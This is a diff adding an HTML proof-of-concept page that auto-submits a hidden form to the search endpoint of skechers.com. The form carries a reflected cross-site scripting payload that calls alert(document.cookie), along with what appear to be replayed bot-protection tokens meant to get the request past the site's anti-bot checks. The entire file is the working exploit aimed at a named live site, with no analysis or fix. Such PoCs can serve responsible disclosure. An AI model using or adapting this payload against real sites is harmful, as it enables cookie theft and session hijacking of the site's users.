@@ -1,0 +1,34 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>PoC</title>
+  </head>
+  <body onload="document.forms[0].submit()">
+    <form method="GET" action="https://www.skechers.com/search/">
+      <input
+        type="hidden"
+        name="q"
+        value="<Img Src=OnXSS onerror=alert(document.cookie)>"
+      />
+
+      <input type="hidden" name="search-button" value="" />
+      <input type="hidden" name="show-view-more" value="" />
+      <input type="hidden" name="lang" value="en_US" />
+
+      <input
+        type="hidden"
+        name="x-kpsdk-ct"
+        value="0SGmRx0bStZ6fxcqeRp4fvfpZ0fNssbs3mW4RrlbMfJejF5MAs5ZVTjNazgVTvmTCfFNW74pEpOVB2AtpHd53fxy0pLYps5mRz0bN5KsgdMoSDbtbJph93ONsRnIKOqDXCupfJb9HJ8OiPaEnTUT4tZQuNhBALTkigyUgdggyXZe"
+      />
+
+      <input type="hidden" name="x-kpsdk-v" value="j-1.2.522" />
+
+      <input
+        type="hidden"
+        name="x-kpsdk-h"
+        value="01LAYcQHBsrRxyq9ja%2BCNVxPZlQ9g%3D"
+      />
+    </form>
+  </body>
+</html>
